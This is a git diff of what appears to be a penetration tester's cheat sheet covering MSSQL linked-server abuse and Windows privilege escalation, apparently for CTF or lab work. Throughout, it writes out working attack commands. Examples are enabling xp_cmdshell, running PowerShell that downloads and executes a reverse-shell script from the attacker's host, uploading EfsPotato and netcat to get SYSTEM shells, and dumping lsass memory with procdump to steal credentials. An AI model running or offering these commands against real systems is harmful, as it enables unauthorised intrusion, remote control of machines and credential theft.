@@ -907,13 +907,15 @@ impacket-mssqlclient '$DOM'/'$USERNAME':'$PASSWORD'@'$TARGET' -windows-auth
 +---------- Impersonate and Links----------+
 enum_impersonate
 exec_as_login sa
-enable_xp_cmdshell
 enum_links
-use_link "ZSM-SVRCSQL02"
-enable_xp_cmdshell
-xp_cmdshell powershell -c "IEX (New-Object Net.WebClient).DownloadString(\"http://$MYIP:53/resh.ps1\"); resh -Reverse $MYIP -Port 80"
+use_link "SQL02"
 use_link ..
-xp_cmdshell powershell -c "IEX (New-Object Net.WebClient).DownloadString(\"http://$MYIP:53/resh.ps1\"); resh -Reverse $MYIP -Port 80"
+enable_xp_cmdshell
+upload /Upload/windows/EfsPotato.exe C:\ProgramData\EfsPotato.exe
+upload /Upload/windows/nc.exe C:\ProgramData\nc.exe
+xp_cmdshell c:\programdata\EfsPotato.exe "powershell -c \"whoami; arp -a; hostname\""
+xp_cmdshell c:\programdata\EfsPotato.exe "powershell -c C:\programdata\nc.exe $MYIP 80 -e cmd"
+xp_cmdshell powershell -c "IEX (New-Object Net.WebClient).DownloadString(\"http://$MYIP/resh.ps1\"); resh -Reverse $MYIP -Port 80"
 
 +---------- Get Hash ----------+
 sudo responder -I tun0 -v
@@ -1588,8 +1590,6 @@ forfiles /p C:\Windows\System32 /m cmd.exe /c "cmd /c \\$MYIP\$\EfsPotato.exe ""
 wmic process call create "\\$MYIP\$\EfsPotato.exe \"\\$MYIP\$\nc.exe $MYIP 80 -e cmd\""
 wmic process call create "\\$MYIP\$\jp32.exe -l 1337 -p \"cmd.exe\" -a \"/c \\$MYIP\$\nc.exe $MYIP 80 -e cmd\"  -t * -c {3c6859ce-230b-48a4-be6c-932c0c202048}
 wmic process call create "\\$MYIP\$\churrasco.exe -d \"\\$MYIP\$\nc.exe -e cmd.exe $MYIP 80\""
-xp_cmdshell c:\programdata\EfsPotato.exe "powershell -c C:\programdata\nc.exe $MYIP 80 -e cmd"
-xp_cmdshell c:\programdata\EfsPotato.exe "powershell -c type C:\Users\Administrator\Desktop\root.txt"
 
 +---------- SeDebugPrivilege ----------+
 curl $MYIP/windows/procdump64.exe -o \programdata\procdump.exe; \programdata\procdump.exe -accepteula -ma lsass.exe lsass.dmp
